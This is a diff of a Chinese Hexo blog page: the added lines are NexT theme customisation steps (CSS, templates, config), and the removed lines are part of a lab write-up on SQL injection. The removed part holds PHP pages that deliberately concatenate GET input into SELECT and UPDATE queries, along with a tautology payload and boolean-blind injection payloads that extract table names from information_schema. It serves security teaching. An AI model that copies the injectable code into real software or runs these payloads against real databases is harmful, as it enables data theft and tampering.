+<p>此方法不适用于 <code>Pisces Scheme</code>， <code>Pisces Scheme</code> 编辑<code>themes/next/source/css/_schemes/Picses/_layout.styl</code>文件，更改以下 css 选项定义值</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.header</span> &#123;<span class="attribute">width</span>: <span class="number">1150px</span>;&#125;</span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-class">.main-inner</span> &#123;<span class="attribute">width</span>: <span class="number">1150px</span>;&#125;</span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;<span class="attribute">width</span>: <span class="built_in">calc</span>(100% - 260px);&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。</li>
+<li>文章内链接样式美化</li>
 </ul>
-<p>html文件源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./4.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/g.png" alt="coin"></p>
-<p>php文件源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rand</span><span class="params">($length = <span class="number">5</span>, $char = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_int($length) || $length &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = $length; $i &gt; <span class="number">0</span>; $i--) &#123;</span><br><span class="line">        $string .= $char[mt_rand(<span class="number">0</span>, strlen($char) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id' AND score&gt;60;"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"yes"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#我们这里把没有查到的以及低于60分的都归为no</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"no"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/h.png" alt="coin"></p>
+<p>在主题目录下，将<code>source/css/_custom/custom.styl</code>文件修改如下：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 文章内链接文本样式</span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="selector-tag">color</span>: <span class="selector-id">#fc6423</span>;</span><br><span class="line">    <span class="selector-tag">border-bottom</span>: <span class="selector-tag">none</span>;</span><br><span class="line">    <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。例如如输入学号，查询是否有学生存在，然后输出固定内容。</li>
+<li>文章内代码美化</li>
 </ul>
-<p>html文件源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./5.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/i.png" alt="coin"></p>
-<p>php文件源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"pass"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"pass"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/j.png" alt="coin"></p>
+<p><strong>行内代码</strong></p>
+<p>在主题目录下，将<code>source/css/_custom/custom.styl</code>文件修改如下：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//行内代码样式</span><br><span class="line"><span class="selector-tag">code</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#c7254e</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f9f2f4</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#d6d6d6</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">1px</span> <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">word-break</span>: break-all;</span><br><span class="line">    <span class="attribute">border-radius</span>:<span class="number">4px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>区块代码</strong></p>
+<p>在主题目录下，修改config.yml文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#   样式可选： normal | night | night eighties | night blue | night bright</span><br><span class="line">highlight_theme: night</span><br></pre></td></tr></table></figure>
 <ul>
-<li>据输入的参数值，拼接 SQL 语句并执行，更新数据库。如输入学号和分数，将对应学生的分数更新。</li>
+<li>添加文章结束语</li>
 </ul>
-<p>html文件源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>database update test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./6.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        student score:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"score"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"update"</span> <span class="attr">name</span>=<span class="string">"update"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/k.png" alt="coin"></p>
-<p>php文件源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $score=$_GET[<span class="string">'score'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con,<span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"UPDATE student SET score='$score' WHERE id='$id';"</span>);</span><br><span class="line">                <span class="comment">#更新后的结果输出</span></span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name,score FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"更新后的结果输出"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result[<span class="string">"name"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"score:"</span>.$result[<span class="string">"score"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/l.png" alt="coin"></p>
-<p>###手工注入实验</p>
+<p><strong>添加模板文件</strong></p>
+<p>在主题目录下<code>/layout/_macro</code>中新建 <code>passage-end-tag.swig</code>文件,并添加以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span></span><br><span class="line">              -------------本文结束<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-paw"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>感谢您的阅读-------------</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>导入模板文件</strong></p>
+<p>在<code>/layout/_macro/post.swig</code>文件中，找到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;#####################&#125;</span><br><span class="line">&#123;### END POST BODY ###&#125;</span><br><span class="line">&#123;#####################&#125;</span><br></pre></td></tr></table></figure>
+<p>在上面代码之前添加：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span>&gt;</span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">          &#123;% include 'passage-end-tag.swig' %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>配置</strong></p>
+<p>在主题配置文件中添加：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
 <ul>
-<li>对于第一种漏洞场景，我们可以使用万能密码<code>&#39; or &#39;1&#39; = &#39;1</code>的方法，将作为参数id通过GET的传参方式拼接到sql语句中。使得数据库查询语句变为</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,score <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span> =<span class="string">'1'</span>;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>正常访问场景</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/a1.png" alt="coin"></p>
-<p><img src="/网络安全实验/网络对抗原理实验一/a2.png" alt="coin"></p>
-<blockquote>
-<p>上述万能密码注入结果可将整个test表输出</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/a3.png" alt="coin"></p>
-<p><img src="/网络安全实验/网络对抗原理实验一/a4.png" alt="coin"></p>
+<li><p>增强文章底部版权信息</p>
 <ul>
-<li><p>这个这种情况属于True or False类型的漏洞，只会返回布尔值而不会返回查询结果，所以我们首先需要猜测数据库名字的长度，接着一个字母一个字母的猜测，根据服务器返回的确认信息，最终确认每个字母。</p>
-<ol>
-<li><p>先判断是否有注入点</p>
-<ul>
-<li><p>是否有整型注入点<br><img src="/网络安全实验/网络对抗原理实验一/b3.png" alt="coin"></p>
-</li>
-<li><p>是否有字符型注入点<br><img src="/网络安全实验/网络对抗原理实验一/b4.png" alt="coin"></p>
-<blockquote>
-<p>结果都没有<br><img src="/网络安全实验/网络对抗原理实验一/b5.png" alt="coin"></p>
-</blockquote>
-<blockquote>
-<p>但是我确实是可以进行注入的</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/b6.png" alt="coin"><br><img src="/网络安全实验/网络对抗原理实验一/b7.png" alt="coin"></p>
-<blockquote>
-<p>究其原因，原来是我在编写第二个php脚本时把所有返回行超过1行的结果都输出no，确实是可以进行注入的</p>
-</blockquote>
-</li>
+<li>增加文章md文件的头部信息中添加<code>copyright: true</code>时，添加版权声明</li>
+<li>增加文章标题、发布时间、更新时间等信息</li>
 </ul>
 </li>
-<li><p>猜测数据库中表的数量</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/b7.png" alt="coin"></p>
-<blockquote>
-<p>第一条就显示yes，说明该数据库中表的数量为1</p>
-</blockquote>
-</li>
-<li><p>猜测每个表的长度</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=2#</span></span><br><span class="line"><span class="string">……………………</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>直到当尝试表长是否为7时，返回yes，得出该表长度为7<img src="/网络安全实验/网络对抗原理实验一/b8.png" alt="coin"></li>
-<li>这里limit a，b  #返回第a+1至a+b行的数据</li>
 </ul>
-</li>
-<li><p>猜测第一个表的表名</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment"># =&gt;true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122# =&gt;true</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">109</span><span class="comment"># =&gt;true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118# =&gt;false</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span><span class="comment"># =&gt; true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117# =&gt; false</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">116</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<p> <strong>TIPS:substr的用法</strong></p>
-<blockquote>
-<p>一般有两种<br> SBUSTR(str,pos);<br> 就是从pos开始的位置，一直截取到最后</p>
-</blockquote>
-<blockquote>
-<p>SUBSTR(str,pos,len);<br> 这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。</p>
-</blockquote>
-<p> 猜测第二个字母的时候可以用</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p> 猜测第二个表的第一个字母是可以用</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">2</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>以此类推就可以得到表名为student</p>
-</blockquote>
-</li>
-<li><p>猜测student表中每列的名字</p>
+<p>在目录<code>next/layout/_macro/</code>下找到<code>post-copyright.swig</code>，进行部分修改：</p>
